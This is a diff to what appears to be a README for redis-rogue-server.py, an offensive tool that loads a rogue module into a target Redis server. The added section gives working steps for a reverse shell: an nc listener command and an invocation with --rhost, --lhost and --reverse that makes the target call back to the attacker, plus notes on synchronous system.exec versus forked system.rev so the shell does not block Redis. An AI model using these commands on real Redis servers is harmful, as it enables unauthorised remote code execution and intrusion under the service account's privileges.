@@ -45,7 +45,20 @@ python3 redis-rogue-server.py --rhost "$TARGET_IPV4" --lhost "$LOCAL_IPV4"
 
 Choose i, enter a command such as id, then enter exit to return to the menu. Each command is a separate shell invocation; it is not a persistent terminal. Choose q to unload the module and quit.
 
-For a reverse shell, start a listener on another **target-reachable** port, then choose r in the menu and enter its numeric IPv4 address and port. The module's system.rev response confirms only that the request was accepted. Verify the callback and user identity in the listener itself. The module runs with the Redis service account's privileges.
+For a reverse shell, start a listener on another **target-reachable** port. Then use the dedicated option:
+
+~~~sh
+CALLBACK_PORT=YOUR_LISTENER_PORT
+nc -lvnp "$CALLBACK_PORT"  # in a separate terminal
+
+python3 redis-rogue-server.py \
+  --rhost "$TARGET_IPV4" --lhost "$LOCAL_IPV4" \
+  --reverse "$LOCAL_IPV4:$CALLBACK_PORT"
+~~~
+
+You can also choose r in the interactive menu and enter the numeric IPv4 address and port. This calls the module's forked system.rev command, which returns without waiting for the shell to exit. The acknowledgement confirms only that the request was accepted; verify the callback and user identity in the listener itself. The module runs with the Redis service account's privileges.
+
+Use --command only for commands that finish promptly, such as id. It invokes synchronous system.exec. Passing a persistent reverse-shell command through --command can block Redis, make the Python client time out, and prevent cleanup until that shell closes.
 
 ## Checks and recovery
 
